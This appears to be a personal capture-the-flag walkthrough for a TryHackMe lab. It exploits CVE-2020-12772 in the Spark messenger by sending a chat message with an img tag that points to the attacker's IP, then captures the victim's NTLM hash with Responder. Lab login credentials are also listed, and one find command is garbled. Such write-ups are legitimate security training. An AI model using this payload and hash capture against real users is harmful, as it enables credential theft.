You can notice that in the same flag;'s directory there some files starting with "spark".
There's a `.deb` file and you can see what its content is.

#smbclient 
- Download the spark* files.
```
mget spark*
```

#Attacking_Machine 
- Look at spark_2_8_3.deb content.
```
dpkg-deb -I spark_2_8_3.deb
```

![[Spark Messenger-20250424121329878.webp]]

### Installing spark

As this program pre-Depends: *openjdk-8-jre | oracle-java8-jre*. You can install this packages following the steps oon [[Install OpenJDK 8 on Kali Linux]].

### If you want to use the `.deb`:

1. **Extract the .deb manually** without installing:
```
dpkg-deb -x spark_2_8_3.deb extracted-spark
```


This unpacks the `.deb` into the `extracted-spark` folder.

2. Search for any `spark` launcher script. In the top extracted folder (where you unpacked `spark_2_8_3.deb` or `.tar.gz`), do:

```
find . -type f -name "spark"cd extracted-spark find . -name "*.jar"
```

Look for small executable files — **not .jar files**.

3. Assuming you're in the folder where you extracted, then:
```
cd usr/share/spark

java -cp "lib/*" org.jivesoftware.launcher.Startup
```

![[Spark Messenger-20250428204457416.webp]]



## Logging in spark


- Intreoduce the following data on the form:
	Username: `lilyle`
	Password: `ChangeMe#1234`
	Domain: `fire.windcorp.thm`


- Go to the advanced settings and disabled these options.
	![[Spark Messenger-20250429111142019.webp]]
	You are logged.
	
	![[Spark Messenger-20250429111333907.webp]]

## Vulnerability

If you look up on the internet you'll find an interesting `CVE-2020-12772` vulnerability.

Visit https://nvd.nist.gov/vuln/detail/CVE-2020-12772.


![[Screenshot from 2025-04-29 11-19-52.png]]

## Explitation

If you go to https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md you can see how the authors found the way of exploiting the vulnerability.

![[Spark Messenger-20250429113402847.webp]]

When you opened a chat with another user, you could send an `<img`  tag to that user with an external URL as the source of that image, like this:

`<img src=http://<your attaching machine IP>/test.img>`

Each time the user clicks the link, or the ROAR module automatically preloads it, the external server receives the request for the image, together with the NTLM hashes from the user that visits the link, i.e. the user you are chatting with!


### Responder

#Attacking_Machine 
Run the following to be able to catch the hash when it comes.

```
sudo responder -I tun0

```

![[Spark Messenger-20250429113141404.webp]]


## Start chat

#sSpark
- Go to Options->Start a Chat.

	![[Spark Messenger-20250429115752719.webp]]

-  After enter an address you'll have a window to chat.
-  Send the message: `<img src=http://10.9.1.138/test.img>`.

	![[Spark Messenger-20250429120805277.webp]]

After a while you'll get the hash on the responder terminal.

![[Spark Messenger-20250429121035765.webp]]

**Next step:** [[Cracking the hash]]

